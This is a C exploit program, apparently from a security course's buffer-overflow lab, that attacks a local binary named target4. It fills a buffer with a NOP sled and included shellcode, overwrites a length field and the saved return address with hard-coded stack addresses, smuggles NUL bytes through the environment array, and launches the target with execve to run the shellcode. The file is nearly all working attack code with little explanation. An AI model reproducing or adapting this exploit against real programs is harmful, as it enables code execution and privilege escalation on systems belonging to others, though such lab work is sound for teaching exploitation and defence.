#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

int main(void)
{
    char *args[3];
    char *env[11];

    uint8_t input[300];
    memset(input, 0x90, sizeof(input));
    memcpy(input, shellcode, sizeof(shellcode) - 1);
    args[0] = TARGET;
    args[1] = input;
    args[2] = NULL;

    input[216] = 0;
    input[217] = 0;
    input[218] = 0;
    input[219] = 0;
    input[220] = 23;
    input[221] = 0;
    input[222] = 0;
    input[223] = 0;

    input[232] = 0xc0;
    input[233] = 0xfd;
    input[234] = 0xa4;
    input[235] = 0x40;
    input[236] = 0x00;
    input[237] = 0x00;
    input[238] = 0x00;
    input[239] = 0x00;
    
    env[0] = &input[217];
    env[1] = &input[218];
    env[2] = &input[219];
    env[3] = &input[220];
    env[4] = &input[222];
    env[5] = &input[223];

    env[6] = &input[224];
    env[7] = &input[237];
    env[8] = &input[238];
    env[9] = &input[239];
    env[10] = NULL;
    
    // buf: 0x40a4fdc0
    // len: 0x40a4fe9c
    // rip: 0x40a4fea8 (address of return address)
    // i:   
    // len: 220
    // rip: 232


    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
